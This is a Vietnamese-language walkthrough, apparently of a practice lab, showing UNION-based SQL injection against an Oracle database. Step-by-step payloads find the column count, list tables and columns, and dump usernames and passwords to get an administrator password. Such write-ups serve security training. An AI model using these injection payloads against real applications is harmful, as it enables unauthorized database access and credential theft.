Sử dụng truy vấn **' UNION+SELECT 'tuong','trung' FROM dual--** xác định được Db có 2 trường dữ liệu.
Bảng DUAL là bảng một hàng một cột đặc biệt được hiển thị theo mặc định trong tất cả các cài đặt cơ sở dữ liệu của Oracle
<br>
Tiếp đó ta sử dụng truy vấn **' UNION+SELECT table_name,NULL FROM all_tables--** để lấy tên các bảng
<br> Ta có 1 số bảng nghi ngờ như sau: <br>
![image](https://user-images.githubusercontent.com/62832067/150348055-fa7b2774-ffd9-4de8-a6c4-f61f67b42cb6.png)
<br> Lấy tên cột của từng bảng bằng truy vấn sau và ta xác định được bảng chứa 2 cột **USERNAME** và **PASSWORD** là bảng **USERS_KWPONQ**  
<br> **'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_KWPONQ'--**
![image](https://user-images.githubusercontent.com/62832067/150348356-32691431-326d-44c3-889d-2448ebc20fc6.png)
<br> Sau khi có tên 2 cột chứa Username và Pass ta thực hiện lấy dữ liệu của 2 cột đó **' UNION SELECT USERNAME_VTWCVL,PASSWORD_XGKINY FROM USERS_KWPONQ--**
<br> Kết quả ta có được Password của tài khoản administator
![image](https://user-images.githubusercontent.com/62832067/150348722-4a064de2-afac-4df7-9481-9197501ad36d.png)

